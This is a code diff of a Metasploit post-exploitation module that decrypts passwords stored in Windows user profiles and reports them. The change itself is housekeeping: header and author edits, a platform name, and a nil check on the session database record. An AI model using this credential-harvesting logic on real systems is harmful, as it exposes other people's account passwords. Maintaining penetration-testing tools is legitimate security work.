@@ -1,13 +1,9 @@
-##
-# $Id$
-##
-
 
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -15,6 +11,7 @@ require 'msf/core'
 require 'rex'
 require 'rexml/document'
 require 'msf/core/post/windows/user_profiles'
+require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::UserProfiles
@@ -33,12 +30,11 @@ class Metasploit3 < Msf::Post
 				'License'       => MSF_LICENSE,
 				'Author'        =>
 					[
-						'TheLightCosine <thelightcosine[at]gmail.com>',
+						'theLightCosine',
 						'hdm', #Helped write the Decryption Routine
-						'Rob Fuller <mubix[at]hak5.org>' #Helped write the Decryption Routine
+						'mubix' #Helped write the Decryption Routine
 					],
-			'Version'       => '$Revision$',
-			'Platform'      => [ 'windows' ],
+			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
@@ -87,11 +83,16 @@ class Metasploit3 < Msf::Post
 			pass=decrypt(decoded, @secret , iv, "AES-128-CBC")
 			print_good("HOST: #{host} PORT: #{port} PROTOCOL: #{proto} Domain: #{domain} USER: #{user} PASS: #{pass}")
 			user= "#{domain}\\#{user}" unless domain.nil? or domain.empty?
+			if session.db_record
+				source_id = session.db_record.id
+			else
+				source_id = nil
+			end
 			report_auth_info(
 				:host  => host,
 				:port => port,
 				:sname => proto,
-				:source_id => session.db_record.id,
+				:source_id => source_id,
 				:source_type => "exploit",
 				:user => user,
 				:pass => pass)
